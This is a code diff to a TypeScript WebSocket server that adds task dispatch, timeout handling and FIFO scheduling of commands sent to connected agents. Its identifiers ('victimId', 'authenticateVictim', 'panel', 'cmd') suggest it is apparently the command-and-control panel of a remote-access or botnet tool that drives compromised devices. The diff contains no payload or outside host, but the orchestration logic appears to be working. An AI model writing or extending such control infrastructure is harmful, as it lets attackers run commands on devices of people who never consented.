@@ -25,6 +25,7 @@ import {
   type ParseFailure
 } from '../lib/ws-protocol';
 import { floor, loadCursors, pruneSeen, remember, saveSeq } from '../lib/ws-state';
+import { expireQueued } from '../lib/tasks';
 
 const TICKET_RATE = 12;
 const SEEN_PRUNE_EVERY = 64;
@@ -58,6 +59,14 @@ type Conn = {
 };
 
 const hub = new Map<string, Conn>();
+/**
+ * reply_to -> task, across sockets: a result replayed after a reconnect keeps
+ * the old reply_to, and a timeout must still drop it later. This window is
+ * only an in-memory shortcut; the durable dedup is the terminal task row.
+ */
+const origins = new Map<string, { victimId: string; taskId: string; unknownOnTimeout: boolean; timer: NodeJS.Timeout }>();
+const dropped = new Map<string, number>();
+let sweeper: NodeJS.Timeout | null = null;
 
 function unsignedFrame(): string {
   return randomBytes(16).toString('base64url');
@@ -88,6 +97,109 @@ function acknowledged(conn: Conn, replyTo: string): void {
 
 function ack(conn: Conn, replyTo: string): void {
   send(conn, 'ack', [['reply_to', replyTo]]);
+}
+
+type Dispatchable = { id: string; victimId: string; name: string; params: unknown; timeoutSec: number };
+
+/** True while the panel still accepts results for this reply_to. */
+function isDropped(replyTo: string): boolean {
+  const until = dropped.get(replyTo);
+  if (until === undefined) return false;
+  if (until <= Date.now()) {
+    dropped.delete(replyTo);
+    return false;
+  }
+  return true;
+}
+
+function inFlight(conn: Conn): number {
+  let count = 0;
+  for (const pending of origins.values()) if (pending.victimId === conn.victimId) count += 1;
+  return count;
+}
+
+/**
+ * Send one `cmd` for a queued task. The deadline is applied on both ends and
+ * a later result is dropped. Returns false when the victim has no ready
+ * socket, so the caller can answer agent_offline.
+ *
+ * The four-in-flight limit is enforced by the agent, not here: the panel sends
+ * every cmd and counts origins only for the UI and the handshake flush.
+ */
+export async function dispatchCommand(task: Dispatchable): Promise<boolean> {
+  const conn = hub.get(task.victimId);
+  return conn ? dispatchTask(conn, task) : false;
+}
+
+/** True when the device has a ready control socket. */
+export function hasControl(victimId: string): boolean {
+  const conn = hub.get(victimId);
+  return Boolean(conn && !conn.closed && conn.stage === 'ready' && conn.socket.readyState === conn.socket.OPEN);
+}
+
+export async function dispatchTask(conn: Conn, task: Dispatchable): Promise<boolean> {
+  // The passed conn may have been superseded between the caller's lookup and
+  // here; always send on the socket the hub currently owns.
+  const target = hub.get(task.victimId);
+  if (!target || !hasControl(task.victimId)) return false;
+  const timeoutMs = Math.max(1_000, Math.min(300_000, task.timeoutSec * 1_000));
+  const reconnect = task.name === 'agent' && (task.params as { command?: string }).command === 'reconnect';
+  const claimed = await prisma.task.updateMany({
+    where: { id: task.id, status: 'queued' },
+    data: { status: 'running', leaseUntil: new Date(Date.now() + timeoutMs), attempts: { increment: 1 } }
+  });
+  if (claimed.count === 0) return true;
+  const replyTo = send(target, 'cmd', [
+    ['name', task.name],
+    ['args', task.params as Field],
+    ['task_id', task.id],
+    ['timeout_ms', timeoutMs]
+  ]);
+  const timer = setTimeout(() => {
+    origins.delete(replyTo);
+    dropped.set(replyTo, Date.now() + 60_000);
+    if (dropped.size > 4096) {
+      for (const [key, until] of dropped) if (until <= Date.now() || dropped.size > 2048) dropped.delete(key);
+    }
+    const status = reconnect ? 'unknown' : 'error';
+    void prisma.task.updateMany({
+      where: { id: task.id, status: { in: ['queued', 'running'] } },
+      data: { status, error: reconnect ? 'unknown: no result before the deadline' : 'timeout', result: {}, finishedAt: new Date(), leaseUntil: null }
+    }).then(() => publish({ type: 'task.update', victimId: conn.victimId, at: Date.now(), data: { id: task.id, status } })).catch(() => undefined);
+    // Any terminal state advances the FIFO chain, not only a result frame.
+    void flushQueued(conn, 1).catch(() => undefined);
+  }, timeoutMs + 5_000);
+  origins.set(replyTo, { victimId: conn.victimId, taskId: task.id, unknownOnTimeout: reconnect, timer });
+  return true;
+}
+
+/**
+ * FIFO handoff of scheduled work, four at a time. The hello starts the chain
+ * and every result pulls one more. Expired slots never run. Flushes for one
+ * device are serialized so concurrent results cannot overshoot the limit.
+ */
+const flushes = new Map<string, Promise<void>>();
+
+function flushQueued(conn: Conn, limit = 4): Promise<void> {
+  const previous = flushes.get(conn.victimId) ?? Promise.resolve();
+  const next = previous.then(() => doFlush(conn, limit)).catch(() => undefined);
+  flushes.set(conn.victimId, next);
+  return next;
+}
+
+async function doFlush(conn: Conn, limit: number): Promise<void> {
+  await expireQueued(conn.victimId);
+  const room = Math.min(limit, 4 - inFlight(conn));
+  if (room <= 0) return;
+  const tasks = await prisma.task.findMany({
+    where: { victimId: conn.victimId, status: 'queued', notBefore: { lte: new Date() } },
+    orderBy: [{ createdAt: 'asc' }, { id: 'asc' }],
+    take: room
+  });
+  for (const task of tasks) {
+    if (conn.closed) return;
+    await dispatchTask(conn, task).catch(() => undefined);
+  }
 }
 
 function stopTimers(conn: Conn): void {
@@ -223,12 +335,24 @@ async function onFrame(conn: Conn, raw: Buffer): Promise<void> {
         if (Date.now() - conn.lastPingAt > PONG_DEADLINE_MS) closeWith(conn, 4408, 'pong timeout');
       }, 5_000);
       await applyHello(conn, json);
+      void flushQueued(conn).catch(() => undefined);
       break;
     }
     case 'result': {
       ack(conn, id);
-      const outcome = await applyTaskResult(conn.victimId, String(json.reply_to), json.body as ResultBody);
-      if (outcome === 'conflict') conn.log.debug({ device_id: conn.victimId, task_id: json.reply_to }, 'duplicate result ignored');
+      const replyTo = String(json.reply_to);
+      const pending = origins.get(replyTo);
+      if (!pending) {
+        if (isDropped(replyTo)) conn.log.debug({ device_id: conn.victimId, task_id: replyTo }, 'late result dropped');
+        else conn.log.debug({ device_id: conn.victimId, reply_to: replyTo }, 'result without a pending cmd');
+        void flushQueued(conn, 1).catch(() => undefined);
+        break;
+      }
+      clearTimeout(pending.timer);
+      origins.delete(replyTo);
+      const outcome = await applyTaskResult(conn.victimId, pending.taskId, json.body as ResultBody);
+      if (outcome === 'conflict') conn.log.debug({ device_id: conn.victimId, task_id: pending.taskId }, 'duplicate result ignored');
+      void flushQueued(conn, 1).catch(() => undefined);
       break;
     }
     case 'event': {
@@ -274,6 +398,15 @@ async function applyHello(conn: Conn, json: Record<string, unknown>): Promise<vo
 }
 
 export const wsRoutes: FastifyPluginAsync = async (app) => {
+  if (!sweeper) {
+    // Scheduled tasks must start when their slot arrives on an idle-but-live
+    // socket; the chain after each result covers the rest.
+    sweeper = setInterval(() => {
+      for (const conn of hub.values()) void flushQueued(conn, 4).catch(() => undefined);
+    }, 5_000);
+    sweeper.unref();
+  }
+
   app.post('/ws-ticket', {
     preHandler: authenticateVictim,
     config: {
